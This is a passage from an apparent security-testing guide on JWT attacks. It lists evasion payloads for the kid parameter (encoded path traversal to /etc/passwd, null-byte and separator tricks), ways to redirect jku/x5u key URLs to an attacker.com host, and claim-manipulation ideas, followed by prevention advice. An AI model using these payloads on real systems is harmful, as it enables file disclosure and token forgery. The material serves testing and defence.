     - URL-encode path traversal characters: `%2e%2e%2f%2e%2e%2fetc%2fpasswd`
     - Double URL-encode path traversal: `%252e%252e%252f%252e%252e%252fetc%252fpasswd`
     - Use Unicode normalization bypasses: `.%c0%ae/%c0%ae/etc/passwd`
     - Use null byte injection: `../../../etc/passwd%00`
     - Try alternative path separators: `..\..\etc\passwd`
     - Mix path separators: `../..\..\etc/passwd`

  3. **Evading JKU/X5U URL validations**:
     - Use subdomain confusion: `https://legitimate-domain.com.attacker.com`
     - Use URL parser inconsistencies: `https://legitimate-domain.com@attacker.com`
     - Exploit open redirects on the legitimate domain
     - Use domain variations: `https://legitímate-domain.com` (using Unicode characters)
     - Add port numbers that might be ignored: `https://legitimate-domain.com:443@attacker.com`
     - Try SSRF bypass techniques for internal URL validation
     - Use URL fragments: `https://legitimate-domain.com#attacker.com`

  4. **JWT claim manipulation obfuscation**:
     - Add unexpected claims that might affect validation
     - Use extremely large number values to cause parsing issues
     - Test off-by-one timestamp values for expiration checks
     - Use very long strings in claim values to cause buffer issues
     - Add Unicode characters in string values
     - Use JSON parsing quirks (duplicate keys, etc.)
     - Inject special characters in claim values to confuse parsers

- **Prevention and mitigation**
  1. **Secure JWT implementation practices**:
     - Use up-to-date, well-maintained JWT libraries
     - Implement proper signature verification
     - Validate all critical claims (exp, iss, aud, nbf, etc.)
     - Use strong, random secrets for HMAC algorithms (at least 256 bits)
     - For RS256, ensure proper key management and rotation
     - Set short expiration times and use refresh tokens where appropriate
     - Maintain a server-side token revocation capability (blacklisting)
     - Implement token binding where possible
     - Use secure headers and cookies for token transmission
     - Never pass tokens as URL parameters

  2. **Proper validation of header parameters**:
     - Explicitly validate the `alg` parameter
     - Reject "none" algorithm and unexpected algorithms
     - Always use a strong, securely stored signing key
     - For `kid` parameter, use a whitelist approach
     - Never use file paths or SQL queries in the `kid` parameter
     - If using `jku` or `x5u`, validate against a strict whitelist of allowed URLs
     - Implement proper SSRF protections for URL-based parameters
     - Validate `jwk` parameter carefully or disable its use
     - For `x5c`, verify certificate chains properly

  3. **Server-side security controls**:
     - Maintain a stateful record of issued tokens where feasible
     - Implement proper token revocation mechanisms
     - Use short-lived tokens (maximum 15 minutes)
     - Force re-authentication for sensitive operations
     - Implement rate limiting for token operations
     - Log and monitor JWT usage patterns
     - Validate issuer and audience claims
     - Use multi-factor authentication alongside JWTs
     - Implement proper error handling to avoid information disclosure
     - Perform security testing specifically targeting JWT implementations
